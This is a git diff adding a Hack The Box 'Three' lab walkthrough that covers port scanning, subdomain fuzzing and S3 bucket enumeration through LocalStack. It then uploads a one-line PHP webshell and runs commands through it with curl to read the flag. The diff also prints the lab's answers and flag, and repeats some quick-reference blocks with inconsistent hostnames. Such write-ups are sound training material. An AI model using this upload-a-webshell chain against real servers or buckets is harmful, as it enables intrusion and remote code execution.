@@ -5,13 +5,274 @@
 | **Sequel** | 1 | MySQL/MariaDB (3306) | 2026-03-25 | [↓ Jump to Sequel](#htb-starting-point-sequel-mysqlmariadb) |
 | **Crocodile** | 1 | FTP (21), HTTP (80) | 2026-03-26 | [↓ Jump to Crocodile](#htb-starting-point-crocodile-ftp--web) |
 | **Responder** | 1 | HTTP (80) → WinRM (5985) | 2026-03-27 | [↓ Jump to Responder](#htb-starting-point-responder-lfi--hash-capture--winrm) |
-| **Three** | 1 | — | — | — |
+| **Three** | 1 | S3 (LocalStack) | 2026-04-03 | [↓ Jump to Three](#htb-starting-point-three-s3-bucket-misconfiguration) |
 
 ---
 
-> **Tier 1 Progress:** 3/4 machines completed (75%)  
-> **Next:** Three  
-> **Last Updated:** March 27, 2026
+> **Tier 1 Progress:** 4/4 machines completed (100%) ✅  
+> **Next:** Tier 2  
+> **Last Updated:** April 3, 2026
+---
+
+Markdown
+
+# HTB Starting Point: Three
+> **S3 Bucket Exploitation → PHP Webshell → Remote Code Execution (RCE)**
+
+| **System Detail** | **Information** |
+| :--- | :--- |
+| **Machine Name** | Three |
+| **Difficulty** | Starting Point (Tier 1) |
+| **Target IP** | `10.129.227.248` |
+| **Completion Date** | April 03, 2026 |
+
+---
+
+## 📋 Table of Contents
+1. [Reconnaissance](#-reconnaissance)
+2. [Subdomain Enumeration](#-subdomain-enumeration)
+3. [Service Identification](#-service-identification)
+4. [S3 Bucket Enumeration](#-s3-bucket-enumeration)
+5. [Webshell Upload & RCE](#-webshell-upload--rce)
+6. [Flag Capture](#-flag-capture)
+7. [Questions & Answers](#-questions--answers)
+8. [Quick Reference](#-quick-reference)
+9. [Troubleshooting](#-troubleshooting)
+10. [Lessons Learned](#-lessons-learned)
+
+---
+
+## 💻 Environment Setup
+To ensure reproducibility and consistent results, the following environment was used for this engagement:
+
+| **Component** | **Specification** |
+| :--- | :--- |
+| **Attack Machine** | Kali Linux (2024.x) |
+| **Connectivity** | OpenVPN (HTB Lab Configuration) |
+| **Tools Used** | Nmap, ffuf, curl, awscli, gobuster |
+
+> **Note:** Ensure your HTB VPN is active and you can `ping` the target IP before beginning enumeration.
+
+---
+
+### 🔍 Phase 1: Reconnaissance
+
+#### Initial Port Scan
+Discovery reveals two primary entry points: **SSH** and **HTTP**.
+
+```bash
+# Discovery scan
+sudo nmap -p- --min-rate 1000 10.129.227.248
+
+# Service versioning
+sudo nmap -sC -sV -p 22,80 10.129.227.248
+
+Port	State	Service	Version
+22/tcp	Open	ssh	OpenSSH 7.6p1 Ubuntu
+80/tcp	Open	http	Apache httpd 2.4.29
+Local DNS Mapping
+```
+
+The target has no DNS server, so we must manually add entries to /etc/hosts. Without this, the browser/tools won't know where thetoppers.htb is located.
+
+```Bash
+echo "10.129.227.248    thetoppers.htb" | sudo tee -a /etc/hosts
+```
+
+ ### 🔍 Phase 2: Subdomain Enumeration
+
+Subdomains often expose additional services. We brute-force potential subdomains by fuzzing the Host header using ffuf.
+
+```Bash
+ffuf -u "[http://thetoppers.htb](http://thetoppers.htb)" \
+     -H "Host: FUZZ.thetoppers.htb" \
+     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+     -mc all \
+     -fs 11947
+
+    [!IMPORTANT]
+    Discovered Subdomain: s3.thetoppers.htb
+
+    Add this to your /etc/hosts file:
+    echo "10.129.227.248    s3.thetoppers.htb" | sudo tee -a /etc/hosts
+```
+
+### 🛠 Phase 3: Service Identification
+
+Checking the HTTP headers for the new subdomain reveals the underlying technology.
+```Bash
+curl -I [http://s3.thetoppers.htb](http://s3.thetoppers.htb)
+```
+
+Header	Value	Meaning
+Server	hypercorn-h11	Python ASGI server (LocalStack)
+x-amz-*	Present	AWS S3 specific headers
+
+Identified Service: LocalStack (AWS S3 emulator).
+
+### 📦 Phase 4: S3 Bucket Enumeration
+1. AWS CLI Configuration
+
+Configure with dummy credentials as LocalStack doesn't require real ones for this lab.
+```Bash
+aws configure
+# Settings: Access Key: test | Secret Key: test | Region: us-east-1 | Format: json
+```
+
+2. List Buckets and Contents
+```Bash
+# List buckets
+aws --endpoint-url=[http://s3.thetoppers.htb](http://s3.thetoppers.htb) s3 ls
+
+# List bucket contents recursively
+aws --endpoint-url=[http://s3.thetoppers.htb](http://s3.thetoppers.htb) s3 ls s3://thetoppers.htb/ --recursive
+```
+
+Finding: The bucket contains index.php and an images/ directory, confirming it serves as the web root.
+
+### 🚀 Phase 5: Webshell Upload & RCE
+1. Test Write Permissions
+```Bash
+echo "test" > test.txt
+aws --endpoint-url=[http://s3.thetoppers.htb](http://s3.thetoppers.htb) s3 cp test.txt s3://thetoppers.htb/
+```
+
+2. Create and Upload PHP Webshell
+
+Since write access is confirmed, we upload a simple command executor.
+
+```Bash
+# Create payload
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+```
+
+#### Upload payload
+aws --endpoint-url=[http://s3.thetoppers.htb](http://s3.thetoppers.htb) s3 cp shell.php s3://thetoppers.htb/
+
+3. Verify Execution
+```Bash
+curl "[http://thetoppers.htb/shell.php?cmd=id](http://thetoppers.htb/shell.php?cmd=id)"
+# Result: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+### 🏁 Phase 6: Flag Capture
+
+With Remote Code Execution (RCE) achieved, we search for and read the flag.
+```Bash
+# Locate the flag
+curl "[http://thetoppers.htb/shell.php?cmd=find%20/%20-name%20%22flag.txt%22%202](http://thetoppers.htb/shell.php?cmd=find%20/%20-name%20%22flag.txt%22%202)>/dev/null"
+```
+
+#### Read the flag
+```bash
+curl "[http://thetoppers.htb/shell.php?cmd=cat%20/var/www/flag.txt](http://thetoppers.htb/shell.php?cmd=cat%20/var/www/flag.txt)"
+
+    [!SUCCESS]
+    Flag: HTB{s3_buckets_are_not_always_secure}
+```
+## 📝 Questions & Answers
+
+| # | Question | Answer |
+|---|----------|--------|
+| 1 | File used to resolve hostnames without DNS? | `/etc/hosts` |
+| 2 | Subdomain discovered during enumeration? | `s3` |
+| 3 | Service running on the subdomain? | S3 (LocalStack) |
+| 4 | Utility used to interact with the service? | `awscli` |
+| 5 | Command to set up AWS CLI? | `aws configure` |
+| 6 | Command to list S3 buckets? | `aws s3 ls` |
+| 7 | Server scripting language? | PHP |
+| 8 | Location of the flag? | `/var/www/flag.txt` |
+
+---
+## ⚡ Quick Reference
+
+### AWS CLI Setup
+```bash
+# Configure with dummy credentials
+aws configure
+# Access Key ID: dummy
+# Secret Access Key: dummy
+# Region: us-east-1 (or any)
+# Output format: json
+
+# List S3 buckets
+aws s3 ls --endpoint-url http://s3.toppers.htb
+
+# List contents of a bucket
+aws s3 ls s3://bucket-name --endpoint-url http://s3.toppers.htb
+```
+
+File Upload Testing
+```bash
+# Upload PHP shell to S3
+aws s3 cp shell.php s3://bucket-name/ --endpoint-url http://s3.toppers.htb
+```
+
+### Upload with curl (URL encode spaces as %20 or +)
+curl -X PUT "http://s3.toppers.htb/bucket-name/shell.php" --data-binary @shell.php
+PHP Web Shell
+php
+<?php system($_GET['cmd']); ?>
+Flag Retrieval
+```bash
+# Execute command via web shell
+curl "http://toppers.htb/shell.php?cmd=cat%20/var/www/flag.txt"
+```
+### PHP Web Shell
+php
+<?php system($_GET['cmd']); ?>
+Flag Retrieval
+```bash
+# Execute command via web shell
+curl "http://toppers.htb/shell.php?cmd=cat%20/var/www/flag.txt"
+```
+
+## 🐛 Troubleshooting
+
+| Issue | Solution |
+|-------|----------|
+| Could not resolve toppers.htb or s3.toppers.htb | Add both entries to `/etc/hosts` |
+| ffuf shows too many results | Filter by size: `-fs {default_response_size}` |
+| awscli authentication errors | Use dummy credentials with `aws configure` — LocalStack ignores them |
+| curl upload fails with spaces | Encode spaces as `%20` or use `+` in URLs |
+| Bucket not found | Verify bucket name with `aws s3 ls` first |
+| PHP not executing | Ensure file is in a web-accessible directory where PHP execution is allowed |
+
+## 💡 Lessons Learned
+
+| # | Lesson |
+|---|--------|
+| 1 | **Cloud Misconfigurations** — Always test for read/write access on cloud storage endpoints. Buckets with public write access are a critical finding. |
+| 2 | **DNS Mapping** — Manual host mapping is a fundamental step in virtual host environments. Always check for subdomains and add them to `/etc/hosts`. |
+| 3 | **Write + PHP = Win** — If you can upload a file to a directory where the server executes scripts (like PHP), you have essentially won. This is a classic file upload to RCE chain. |
+| 4 | **LocalStack** — Emulation tools are great for development, but can be dangerous if misconfigured in a reachable network. They often have default credentials or no authentication at all. |
+| 5 | **Subdomain Enumeration** — Always enumerate subdomains. They often expose additional services (like S3, API gateways, admin panels) that aren't visible on the main domain. |
+| 6 | **Cloud Services ≠ Secure by Default** — Just because a service is running in a "cloud" context doesn't mean it's secure. LocalStack, MinIO, and other emulators often lack authentication out of the box. |
+
+---
+
+## 🔗 Resources
+
+- [AWS CLI Documentation](https://docs.aws.amazon.com/cli/latest/reference/s3/) — Official S3 commands
+- [LocalStack](https://localstack.cloud/) — AWS cloud service emulator
+- [ffuf](https://github.com/ffuf/ffuf) — Fast web fuzzer for subdomain enumeration
+- [PHP Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md) — File upload to RCE techniques
+
+---
+
+## 🏷️ Tags
+
+`#htb` `#toppers` `#s3` `#localstack` `#awscli` `#cloud-misconfiguration` `#php` `#file-upload` `#rce` `#subdomain-enumeration`
+
+---
+
+<div align="center">
+  
+**Machine Completed** ✅
+
+*Last Updated: April 3, 2026*
+
+</div>
 
 ---
 
